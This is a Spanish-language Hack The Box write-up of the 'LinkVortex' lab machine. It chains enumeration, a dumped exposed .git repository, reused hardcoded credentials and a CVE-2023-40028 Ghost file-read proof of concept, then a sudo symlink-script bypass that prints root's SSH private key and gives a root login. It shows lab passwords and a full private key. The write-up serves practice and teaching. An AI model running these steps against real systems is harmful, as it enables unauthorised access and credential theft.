+++
author = "Andrés Del Cerro"
title = "Hack The Box: LinkVortex Writeup | Easy"
date = "2024-12-13"
description = ""
tags = [
    "HackTheBox",
    "LinkVortex",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "CVE-2023-40028",
    "Arbitrary File Read",
    "HTTP Enumeration",
    "Exposed Git Repository",
    "git-dumper",
    "Information Disclosure",
    "Reading Plaintext Credentials",
    "Credentials Reuse",
    "Abusing sudo custom script",
    "Abusing indirect symbolic link",
    "Bash Scripting"
]

+++

# Hack The Box: LinkVortex Writeup

Welcome to my detailed writeup of the easy difficulty machine **"LinkVortex"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
rustscan -a 10.129.112.131 --ulimit 5000 -g
10.129.112.131 -> [22,80]
```

```console
nmap -p22,80 -sCV 10.129.112.131 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 12:51 CET
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 12:51 (0:00:00 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 12:51 (0:00:00 remaining)
Nmap scan report for 10.129.112.131
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.13 second
```

# UDP Enumeration

```console
sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.112.131 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 12:52 CET
Nmap scan report for 10.129.112.131
Host is up (0.037s latency).
Not shown: 1495 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
69/udp    closed tftp
1885/udp  closed vrtstrapserver
20031/udp closed bakbonenetvault
22505/udp closed unknown
23354/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds
```

Del escaneo inicial encontramos el dominio `linkvortex.htb`, lo añadimos al `/etc/hosts`

Como no encontramos nada mas relevante por ahora, vamos a enumerar el servicio web ya que la versión de OpenSSH no tiene vulnerabilidades actualmente.

# HTTP Enumeration
`whatweb` nos reporta algo extraño, parece que se está utilizando algo llamado `Ghost 5.58`
```console
whatweb http://linkvortex.htb
http://linkvortex.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.129.112.131], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

Una búsqueda en Google revela que `Ghost` es un proyecto de código abierto para hacerte un blog.
![Write-up Image](images/Screenshot_1.png)

# CVE-2023-40028 (Arbitrary File Read)
Buscando por vulnerabilidades conocidas vemos que parece que existe una vulnerabilidad para poder leer archivos internos de la máquina.
![Write-up Image](images/Screenshot_2.png)

Vamos a clonarnos [el repositorio de la prueba de concepto](https://github.com/0xyassine/CVE-2023-40028/)
```console
git clone https://github.com/0xyassine/CVE-2023-40028/
Cloning into 'CVE-2023-40028'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 7 (delta 1), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (7/7), done.
Resolving deltas: 100% (1/1), done.
```

Revisando el código, primero tenemos que tener credenciales válidas de administrador o un usuario con permisos, en resumen, mediante la creación de un archivo ZIP que contiene un enlace simbólico apuntando al archivo objetivo, el atacante puede engañar a la API de Ghost para que procese el ZIP como si fuera un archivo legítimo. Esto expone el contenido del archivo enlazado a través de un endpoint público, comprometiendo potencialmente información sensible almacenada en el servidor.

Entonces, primero tenemos que saber que el panel de autenticación está en `/ghost`.

También podemos saber que existe un usuario `admin`, pero no sabemos su correo electrónico asociado, podríamos probar el email `admin@linkvortex.htb` y recorrer el diccionario del `rockyou.txt` con `hydra`, o crear un diccionario personalizado basado el posts de este usuario con `cewl`, pero lo veo muy tedioso para una máquina fácil, así que primero vamos a enumerar el sitio web.

Con `feroxbuster` no encontramos ningún recurso interesante.
```console
feroxbuster -u http://linkvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100
```

Buscando archivos con extensiones tampoco encontramos nada interesante.
```console
feroxbuster -u http://linkvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100 -x php,html,txt,bk,gz,zip,js
```

## Subdomain exposed git repository (git-dumper)
Fuzzeando por subdominios con `wfuzz` encontramos uno interesante, `dev.linkvortex.htb`, lo añadimos al `/etc/hosts`
```console
wfuzz --hh=230 -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.linkvortex.htb' http://linkvortex.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://linkvortex.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   200        115 L    255 W      2538 Ch     "dev"
```

Vemos que es una web que en principio, no está activa.
![Write-up Image](images/Screenshot_3.png)

Fuzzeando por recursos, encontramos un recurso interesante, `/.git`
```console
feroxbuster -u http://dev.linkvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.linkvortex.htb
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      115l      255w     2538c http://dev.linkvortex.htb/
301      GET        7l       20w      239c http://dev.linkvortex.htb/.git => http://dev.linkvortex.htb/.git/
```

En estos casos, si está completamente expuesto el repositorio del proyecto, podríamos con `git-dumper` recuperar el proyecto en si y analizar el código fuente en busca de algo interesante.
```console
git-dumper http://dev.linkvortex.htb/.git/ dev.linkvortex.htb
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
...
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Running git checkout .
Updated 5596 paths from the index
```

Y podemos ver que hemos recuperado el código fuente de la aplicación que tiene pinta de que es el blog hosteado en el dominio principal.
```console
➜  dev.linkvortex.htb git:(v5.58.0) ✗ ls
apps  Dockerfile.ghost  ghost  LICENSE  nx.json  package.json  PRIVACY.md  README.md  SECURITY.md  yarn.lock
```

Investigando un poco, `Ghost` utiliza `knex` que es una librería para construir sentencias SQL, una especie de ORM, en `knex` tienes que pasar las credenciales de la base de datos a un archivo de configuración en javascript.

Analizando el código fuente vemos que se incluyen archivos de configuración para la conexión a la base de datos en `ghost/core/server/config/`
![Write-up Image](images/Screenshot_4.png)

Igualmente, viendo el código fuente del proyecto actual, vemos que se encontraría en `ghost/core/core/shared/config`
![Write-up Image](images/Screenshot_5.png)

Dentro encontramos una carpeta `env` con varios archivos de configuración del proyecto.
```console
config git:(v5.58.0) ✗ ls
defaults.json  env  helpers.js  index.js  loader.js  overrides.json  utils.js
➜  config git:(v5.58.0) ✗ cd env
➜  env git:(v5.58.0) ✗ ls
config.development.json  config.production.json  config.testing-browser.json  config.testing.json  config.testing-mysql.json
```

Y no encontramos nada interesante...
![Write-up Image](images/Screenshot_6.png)

 En `VSCode` existe una extensión muy popular llamada `Snyk`, esta extensión permite monitorizar el código para buscar vulnerabilidades, es una especie de SAST pero bastante ligero.

Una vez importado el proyecto, podemos esperar un momento para que se analice todo el código de la aplicación y si analizamos los resultados encontramos un archivo llamado `authentication.test.js` en `ghost/core/test/regression/api/admin/authentication.test.js` que contiene pruebas de autenticación de usuarios, contiene algunas credenciales hardcodeadas como: 
- OctopiFociPilfer45
- thisissupersafe
- lel123456
- 12345678910

![Write-up Image](images/Screenshot_8.png)
![Write-up Image](images/Screenshot_7.png)![Write-up Image](images/Screenshot_9.png)![Write-up Image](images/Screenshot_10.png)

Probando el combo `admin@linkvortex.htb:OctopiFociPilfer45` vemos que ganamos acceso al panel administrativo.

![Write-up Image](images/Screenshot_11.png)

Entonces, ahora, vamos a abrir el script que nos habíamos clonado antes para modificar la URL del `Ghost` al que nos estamos enfrentando.
![Write-up Image](images/Screenshot_12.png)

Y vemos que la vulnerabilidad se acontece y efectivamente podemos leer archivos del sistema.
```console
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

Vemos que existe un usuario `node` pero no podemos acceder a sus ficheros.

Por ahora no encuentro el archivo `config.production.json` que es el que hemos visto antes, quizás ahora si que se estén utilizando credenciales de acceso a la base de datos.
```console
file> /var/www/ghost/core/core/shared/config/env/config.production.json
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Not Found</pre>
</body>
</html>
file> /var/www/html/core/core/shared/config/env/config.production.json
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Not Found</pre>
</body>
</html>
```

No tengo ni idea de donde estará este archivo, así que vamos a investigar un poco, podemos deducir que se está utilizando docker ya que en el código del proyecto hemos visto un `Dockerfile.ghost` y esto es vital porque este archivo nos revela que el archivo de configuración se debería encontrar en `/var/lib/ghost/config.production.json`
```console
cat -p Dockerfile.ghost
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

Y ahora sí, encontramos unas credenciales de un usuario llamado `bob` para SMTP.
```console
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

Podemos probar el combo `bob:fibber-talented-worth` por SSH para ver si se reutilizan credenciales, y efectivamente.
```console
sshpass -p 'fibber-talented-worth' ssh bob@10.129.112.131
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Dec 13 12:59:56 2024 from 10.10.14.197
bob@linkvortex:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

Estamos en la máquina víctima, no en un contenedor.
```console
bob@linkvortex:~$ ip a | grep eth0
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    inet 10.129.112.131/16 brd 10.129.255.255 scope global dynamic eth0
```

Podemos leer la flag de usuario.
```console
bob@linkvortex:~$ cat user.txt
b79c313340e06e...
```

# Privilege Escalation
## Abusing sudo custom script
Podemos ejecutar como cualquier usuario y sin contraseña un script y como parámetro le podemos pasar un archivo png.
```console
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Este archivo es de `root` y no tenemos permiso para editarlo.
```console
ls -la /opt/ghost/clean_symlink.sh
-rwxr--r-- 1 root root 745 Nov  1 08:46 /opt/ghost/clean_symlink.sh
```

Este es el script.
```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

El script gestiona archivos `.png` que sean enlaces simbólicos, verificando si apuntan a rutas críticas como `/etc` o `/root`. Si detecta un intento de acceso a estas rutas, elimina el enlace simbólico para proteger el sistema. En caso contrario, mueve el enlace a un directorio de cuarentena (`/var/quarantined`) y, si la variable `CHECK_CONTENT` está activada, muestra el contenido del archivo al que apuntaba el enlace. Esto lo convierte en una herramienta de mitigación básica contra posibles accesos indebidos mediante enlaces simbólicos maliciosos.

En principio, nosotros controlamos la variable `CHECK_CONTENT`, por lo cual vamos a "settearla" a verdadero.
```console
bob@linkvortex:~$ export CHECK_CONTENT=true
```

Esto hará que el script intente leer el archivo, por lo cual nos da la posibilidad de leer archivos internos.
```bash
if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
```

Entonces, ahora solo falta saltarnos esta comprobación:
```bash
if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)'; then /usr/bin/unlink $LINK
```

Y es fácil, ya que el script elimina el enlace si detecta que apunta a una ruta crítica como `/etc` o `/root`, pero podemos crear un enlace indirecto, de esta forma el script no va a poder detectar la ruta crítica directamente y vamos a poder leer el contenido.

```console
bob@linkvortex:~$ mkdir -p /tmp/pointed
bob@linkvortex:~$ ln -s /root/.ssh/id_rsa /tmp/pointed/id_rsa
bob@linkvortex:~$ ln -s /tmp/pointed/id_rsa exploit.png
```

Creamos un directorio en `/tmp` donde vamos a crear un enlace simbólico apuntando a la clave privada de `root` (si tiene), y luego vamos a crear otro enlace simbólico hacia en enlace que ya habíamos hecho y lo vamos a guardar como `exploit.png`, entonces el script va a detectar que existe un enlace a `/tmp/pointed/id_rsa` pero no que este archivo es un enlace a la clave privada de `root` ya que no hace la comprobación recursivamente.
```console
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh exploit.png
Link found [ exploit.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Y podemos comprobar que funciona y que además `root` tiene una clave privada, ahora podemos guardar esta clave privada en un fichero y darle los permisos necesarios.
```console
chmod 600 id_rsa
```

Y ya podemos autenticarnos como `root` por SSH utilizando su clave privada.
```console
ssh root@10.129.112.131 -i id_rsa
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Podemos leer la flag de root.
```console
root@linkvortex:~# cat root.txt
b44e1fbd2075...
```

¡Y ya estaría!

Happy Hacking! 🚀